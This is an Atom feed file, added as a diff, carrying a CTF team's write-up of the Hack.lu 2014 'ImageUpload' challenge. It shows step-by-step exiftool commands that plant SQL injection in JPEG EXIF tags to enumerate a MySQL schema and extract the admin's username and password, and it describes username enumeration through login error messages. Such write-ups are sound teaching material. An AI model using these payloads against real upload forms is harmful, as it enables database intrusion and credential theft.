@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: sqli | CaptchaFlag CTF Team]]></title>
+  <link href="http://www.captchaflag.com/blog/categories/sqli/atom.xml" rel="self"/>
+  <link href="http://www.captchaflag.com/"/>
+  <updated>2014-10-28T16:35:43-04:00</updated>
+  <id>http://www.captchaflag.com/</id>
+  <author>
+    <name><![CDATA[Captchaflag]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Hack.lu 2014 - ImageUpload]]></title>
+    <link href="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/"/>
+    <updated>2014-10-24T09:25:00-04:00</updated>
+    <id>http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload</id>
+    <content type="html"><![CDATA[<h2>Challenge</h2>
+
+<p>In the Wild Wild Web, there are really bad guys. The sheriff doesn't know them all. Therefore, he needs your help.
+Upload pictures of criminals to this site and help the sheriff to arrest them.
+You can make this Wild Wild Web much less wild!!!</p>
+
+<p>Pictures will be deleted on regular basis!</p>
+
+<h2>Analysis</h2>
+
+<p>The site is two separate pages. One is a simple submit form in which you upload an image to the site. It explicitly asks for .jpg or .jpeg images. The second page is a simple login form that has a valid username of <code>sheriff</code>, that can be detected based on differentiating responses of failed logins (invalid user vs invalid password).</p>
+
+<p>The form submissions explicitly asks for .jpg or .jpeg images, however if you rename the extension of another file type it appears to pass but
+has issues printing. After uploading the image, it displays three exif tags: <code>author</code>, <code>manufacturer</code>, and <code>model</code>. These tags, along with heigh tand width information are displayed in a table beneath the image.</p>
+
+<p>First attempts were to embed javascript into exif tags using exiftool, assuming a sheriff user would login to view the criminals. The values appear to be HTML encoded, however providing a single quote led to a database error. Looks like SQL injection.</p>
+
+<p>Here is the list of modifications I made to my jpeg to get info from the database:</p>
+
+<ul>
+<li><code>exiftool &quot;-artist=stacks0n&quot; hack.jpg</code>
+
+<ul>
+<li>ensure existence of Author field</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer','Model') -- &quot; hack.jpg</code>
+
+<ul>
+<li>test injection</li>
+</ul></li>
+<li><code>exiftool -artist=Artist','Manufacturer',concat('a','b')) -- &quot; hack.jpg</code>
+
+<ul>
+<li>test for MySQL</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT count(table_name) FROM information_schema.tables )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get number of tables (43)</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT table_name FROM information_schema.tables LIMIT 42,1 )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get table name (users)</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT column_name FROM information_schema.columns where table_name = 'users' LIMIT 0,1  )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get column names (id, name, password)</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist',(SELECT name from users where id = 1 ),(SELECT password from users where id = 1 )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get login info (sheriff, AO7eikkOCucCFJOyyaaQ)</li>
+</ul></li>
+</ul>
+
+<p>Lastly, login as sheriff for flag.</p>
+
+<h2>Solution</h2>
+
+<p>You are sucessfully logged in.</p>
+
+<p>Flag: flag{1_5h07_7h3_5h3r1ff}</p>
+]]></content>
+  </entry>
+  
+</feed>
